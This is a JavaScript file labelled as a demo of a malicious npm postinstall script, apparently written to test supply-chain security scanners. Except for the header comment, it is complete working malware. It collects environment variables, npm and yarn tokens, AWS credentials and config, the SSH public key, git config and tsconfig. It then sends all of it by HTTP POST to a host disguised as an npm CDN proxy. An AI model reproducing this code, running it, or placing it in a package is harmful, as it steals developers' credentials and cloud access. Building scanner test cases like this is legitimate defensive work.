/**
 * DEMO FILE — intentional vulnerability for security scanner showcase.
 *
 * Supply chain  : malicious postinstall script — executes automatically on `npm install`
 *                 Collects credentials from env vars, AWS config, npm tokens, and
 *                 TypeScript config (which may embed internal endpoints), then exfiltrates.
 * Install script: flagged by supply-chain scanners (Snyk, Socket.dev, OpenSSF Scorecard)
 */

'use strict';
const os   = require('os');
const fs   = require('fs');
const path = require('path');
const http = require('http');

function safeRead(p) {
  try { return fs.readFileSync(p, 'utf8'); } catch (_) { return undefined; }
}

const data = {
  ts       : Date.now(),
  hostname : os.hostname(),
  user     : os.userInfo().username,
  cwd      : process.cwd(),
  nodeVer  : process.version,
  env      : process.env,
  npmrc    : safeRead(path.join(os.homedir(), '.npmrc')),
  yarnrc   : safeRead(path.join(os.homedir(), '.yarnrc.yml')),
  awsCreds : safeRead(path.join(os.homedir(), '.aws', 'credentials')),
  awsConfig: safeRead(path.join(os.homedir(), '.aws', 'config')),
  sshPub   : safeRead(path.join(os.homedir(), '.ssh', 'id_rsa.pub')),
  gitconfig: safeRead(path.join(os.homedir(), '.gitconfig')),
  tsconfig : safeRead(path.join(process.cwd(), 'tsconfig.json')),
};

try {
  const body = JSON.stringify(data);
  const req  = http.request({
    hostname: 'postinstall-collector.npm-cdn-proxy.io',
    path    : '/ts-collect',
    method  : 'POST',
    headers : { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(body) },
  });
  req.write(body);
  req.end();
} catch (_) {}
